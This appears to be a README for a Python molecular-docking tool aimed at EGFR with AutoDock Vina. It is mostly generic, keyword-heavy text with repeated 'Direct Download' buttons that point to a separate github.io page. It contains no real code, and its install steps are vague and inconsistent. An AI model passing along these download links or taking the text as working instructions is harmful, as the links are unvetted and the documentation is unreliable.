# Basic Molecular Docking v2026 - computational drug discovery 2026

> **Basic Molecular Docking is a Python-based computational drug discovery tool for running AutoDock Vina workflows against the EGFR kinase domain, helping users carry out in silico screening and interpret binding affinity results in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevin-hayes45/basic-molecular-docking-v2026?style=flat-square)](https://github.com/kevin-hayes45/basic-molecular-docking-v2026)

---

<p align="center">
  <a href="https://kevin-hayes45.github.io/basic-molecular-docking-v2026/">
    <img src="https://img.shields.io/badge/Download-Basic%20Molecular%20Docking%20Latest-brightgreen?style=for-the-badge" alt="Download Basic Molecular Docking">
  </a>
</p>

> **[Direct Download - Basic Molecular Docking v2026](https://kevin-hayes45.github.io/basic-molecular-docking-v2026/)**

---

[Download Latest Build](https://kevin-hayes45.github.io/basic-molecular-docking-v2026/)

---

## Overview

Basic Molecular Docking provides a lightweight, reproducible path for molecular docking experiments focused on the EGFR kinase domain. It ties together receptor setup, ligand setup, docking execution, and post-run analysis, reducing the amount of manual work needed to move from structures to results.

It is intended for computational drug discovery tasks where users need docking scores, Ki estimates, and ranked poses for comparison. The workflow is well suited to screening several ligands, including approved drugs and control molecules, in a computer-aided drug discovery process that relies on PubChem-derived compounds and AutoDock Vina scoring.

---

## What it includes

- Runs ligand docking against the EGFR kinase domain
- Built around an AutoDock Vina docking workflow
- Covers receptor preparation and ligand preparation
- Reviews docking scores and estimated Ki values
- Outputs result tables for easier side-by-side comparison
- Creates publication-style figures for summaries and reports
- Works with multiple ligands, including approved drugs and controls
- Supports in silico screening and CADD-style analysis workflows

---

## Installation

Clone the repository or download the project files, then prepare a Python environment before launching the workflow.

1. Clone the repository:
   `git clone https://github.com/kevin-hayes45/basic-molecular-docking-v2026.git
2. Enter the project folder:
   `cd Basic-Molecular-Docking`
3. Install the required Python packages used by the workflow.
4. Run the main script or notebook that launches the docking pipeline.

If you downloaded a release package instead of cloning the source, extract it first and start from the project entry point included in the files.

---

## Usage

A normal run follows a prepare -> dock -> analyze sequence:

1. Prepare the EGFR protein receptor.
2. Prepare one or more ligands, such as PubChem compounds or reference drugs.
3. Run the AutoDock Vina docking step.
4. Inspect docking scores and Ki estimates.
5. Export or review the generated tables and figures.

Example workflow outline:

- load receptor structure
- define ligand set
- execute docking runs
- compare binding affinity results
- review visualization outputs for reporting

---

## Configuration

Run settings are usually defined in the script, notebook, or local parameter files that control the docking job.

Common items to configure include:

- receptor input path
- ligand input files
- docking box coordinates
- output directory
- scoring and analysis options

Example configuration shape:

    receptor_path: data/egfr_receptor.pdb
    ligand_list: data/ligands/
    output_dir: results/
    docking_box:
      center_x: 0.0
      center_y: 0.0
      center_z: 0.0

Adjust these values to match your structures and desired screening setup.

---

## Requirements

- Python runtime
- AutoDock Vina
- Input structures for the EGFR receptor
- Ligand files, such as compounds sourced from PubChem
- Local storage for docking outputs, result tables, and figures
- A system capable of running computational docking workloads

---

## FAQ

**How do I begin?**  
Clone or download the project, install the Python dependencies, and launch the docking workflow from the included entry point.

**Can I bring my own ligands?**  
Yes. The workflow handles multiple ligands, so you can compare custom compounds with approved drugs or controls.

**Where do the results go?**  
Outputs are saved in the configured results directory, including the tables and figure files produced during analysis.

**What if the docking output seems off?**  
Review receptor preparation, ligand preparation, docking box settings, and file paths before running the workflow again.

**How do I update the project?**  
Use the newest source or download package from the project location and replace your local copy with the updated files as needed.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
